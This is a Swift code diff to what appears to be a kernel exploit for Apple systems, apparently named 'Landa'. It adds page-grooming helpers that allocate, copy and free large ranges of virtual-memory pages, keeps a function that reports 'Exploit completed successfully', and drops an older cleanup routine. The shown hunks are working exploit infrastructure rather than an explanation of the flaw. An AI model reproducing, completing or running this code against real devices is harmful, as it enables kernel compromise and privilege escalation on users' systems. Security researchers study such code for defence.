@@ -10,9 +10,11 @@ import Atomics
 import os
 
 class freePages {
-    let base: vm_address_t
-    let count: Int
+    var base: vm_address_t
+    var count: Int
     let primitive: Landa
+    
+    var pageInUse: vm_address_t = 0
     
     init?(count: Int) {
         self.count = count
@@ -21,6 +23,72 @@ class freePages {
         let base = primitive.prime(count: count)
         guard base != 0 else { return nil }
         self.base = base
+    }
+    
+    deinit {
+        if base != 0, count != 0 {
+            _ = clearAll()
+        }
+    }
+
+    func markUsed(page: vm_address_t) -> Bool {
+        guard pageInUse == 0 else {
+            print("[FreePages] A page is already marked as used: 0x\(String(pageInUse, radix: 16)).")
+            return false
+        }
+        pageInUse = page & (~0x3fff)
+        return true
+    }
+
+
+    func clearUnused() -> Bool {
+//        TBD: Check that addresses are page round
+        guard pageInUse != 0 else {
+            print("[FreePages] Error: No page is marked as used.")
+            return false
+        }
+        guard pageInUse != base, count != 1 else {
+            print("[FreePages] Unused pages already cleared.")
+            return false
+        }
+
+        if pageInUse > base {
+            let kr = vm_deallocate(mach_task_self_, base, vm_size_t(pageInUse - base))
+            if kr != KERN_SUCCESS {
+                print("[FreePages] vm_deallocated failed with error: \(String(cString: mach_error_string(kr)))")
+                return false
+            }
+        }
+
+        if base + pages(count) > pageInUse + pages(1) {
+            let kr = vm_deallocate(mach_task_self_, pageInUse + pages(1), vm_size_t(base + pages(count - 1) - pageInUse))
+            if kr != KERN_SUCCESS {
+                print("[FreePages] vm_deallocated failed with error: \(String(cString: mach_error_string(kr)))")
+                return false
+            }
+        }
+
+        base = pageInUse
+        count = 1
+        print("[FreePages] Cleared unused pages.")
+        return true
+    }
+
+    func clearAll() -> Bool {
+        guard base != 0, count != 0 else {
+            print("[FreePages] Error: Nothing to clear.")
+            return false
+        }
+        let kr = vm_deallocate(mach_task_self_, base, pages(count))
+        guard kr == KERN_SUCCESS else {
+            print("[FreePages] vm_deallocated failed with error: \(String(cString: mach_error_string(kr)))")
+            return false
+        }
+        base = 0
+        count = 0
+        pageInUse = 0
+        print("[FreePages] Cleared all pages.")
+        return true
     }
     
     func getBase() -> vm_address_t {
@@ -32,15 +100,15 @@ class freePages {
     }
     
     func grabFreePages() -> Bool {
-        let MAX_PAGE_CNT: Int = 400_000
+        let MAX_PAGE_CNT: Int = 100_000
         var pageMatched: UInt64 = 0
         var src: vm_address_t = 0
         var dst: vm_address_t = 0
         let pageSize = pages(1)
-
+        print("[FreePages] Allocating free pages.")
         var kr = vm_allocate(mach_task_self_, &src, pageSize, VM_FLAGS_ANYWHERE)
         if kr != KERN_SUCCESS {
-            print("[Landa] vm_allocate failed with error: \(String(describing: mach_error_string(kr)))")
+            print("[FreePages] vm_allocate failed with error: \(String(describing: mach_error_string(kr)))")
             return false
         }
 
@@ -56,11 +124,8 @@ class freePages {
             return false
         }
 
-        var dstAllocated = true
         defer {
-            if dstAllocated {
-                vm_deallocate(mach_task_self_, dst, pages(MAX_PAGE_CNT))
-            }
+            vm_deallocate(mach_task_self_, dst, pages(MAX_PAGE_CNT))
             vm_deallocate(mach_task_self_, src, pageSize)
         }
         let srcPtr = UnsafeRawPointer(bitPattern: UInt(src))!
@@ -69,7 +134,7 @@ class freePages {
         for i in 0..<MAX_PAGE_CNT {
             kr = vm_copy(mach_task_self_, src, pageSize, dst + pages(i))
             if kr != KERN_SUCCESS {
-                print("[Landa] Copying page failed at page \(i): \(String(cString: mach_error_string(kr)))")
+                print("[FreePages] Copying page failed at page \(i): \(String(cString: mach_error_string(kr)))")
                 return false
             }
             for j in 0..<count {
@@ -78,21 +143,18 @@ class freePages {
                     pageMatched += 1
                 }
                 if pageMatched >= UInt64(count / 5) {
-                    print("[Landa] Allocated \(i), matched with \(pageMatched)")
+                    print("[Landa] Allocated \(i) free pages.")
                     return true
                 }
             }
         }
-        print("[Landa] Fail to meet free page goal: \(pageMatched)")
+        print("[FreePages] Fail to meet free page goal: \(pageMatched)")
         return false
     }
 }
 
 
 class Landa {
-    var start: vm_address_t = 0;
-    var end: vm_address_t = 0;
-
     final class SpinnerArgs {
         let address: vm_address_t
         let size: vm_size_t
@@ -216,23 +278,6 @@ class Landa {
             return 0
         }
         print("[Landa] Exploit completed successfully.")
-        start = d[3]
-        end = d[3] + sz[0]
         return d[3]
-    }
-    
-    func cleanup() {
-        guard start != 0, end > start else {
-            print("[Landa] Nothing to cleanup.")
-            return
-        }
-        let kr = vm_deallocate(mach_task_self_, start, vm_size_t(end - start))
-        if kr == KERN_SUCCESS {
-            print("[Landa] Deallocating [0x\(String(start, radix: 16)), 0x\(String(end, radix: 16))).")
-        } else {
-            print("[Landa] vm_deallocate failed with error: \(String(cString: mach_error_string(kr)))")
-        }
-        start = 0
-        end = 0
     }
 }
